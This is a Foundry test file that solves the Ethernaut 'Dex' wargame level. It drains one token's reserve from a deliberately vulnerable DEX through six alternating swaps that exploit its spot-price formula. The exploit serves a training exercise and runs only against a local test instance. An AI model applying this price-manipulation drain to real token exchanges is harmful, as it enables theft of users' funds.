// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "../src/22-Dex/Dex.sol";
import "../src/22-Dex/DexFactory.sol";
import "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";

contract DexTest is Test {
    Ethernaut ethernaut;
    DexFactory level;
    Dex instance;
    address player = address(123456);
    address instanceAddress;

    function setUp() public {
        ethernaut = new Ethernaut();
        level = new DexFactory();
        ethernaut.registerLevel(level);
        startHoax(player);
        instanceAddress = ethernaut.createLevelInstance(level);
        instance = Dex(payable(instanceAddress));
    }

    function testDexHack() public {
        address token1 = instance.token1();
        IERC20(token1).approve(instanceAddress, type(uint256).max);
        address token2 = instance.token2();
        IERC20(token2).approve(instanceAddress, type(uint256).max);

        instance.swap(token1, token2, 10);
        instance.swap(token2, token1, 20);
        instance.swap(token1, token2, 24);
        instance.swap(token2, token1, 30);
        instance.swap(token1, token2, 41);
        instance.swap(token2, token1, 45);

        emit log_named_uint(
            "balance of token1 of dex",
            instance.balanceOf(token1, instanceAddress)
        );
        emit log_named_uint(
            "balance of token2 of dex",
            instance.balanceOf(token2, instanceAddress)
        );

        assertTrue(
            instance.balanceOf(token1, instanceAddress) == 0 ||
                instance.balanceOf(token2, instanceAddress) == 0
        );

        bool levelCompleted = ethernaut.submitLevelInstance(
            payable(instanceAddress)
        );
        assert(levelCompleted);
    }
}
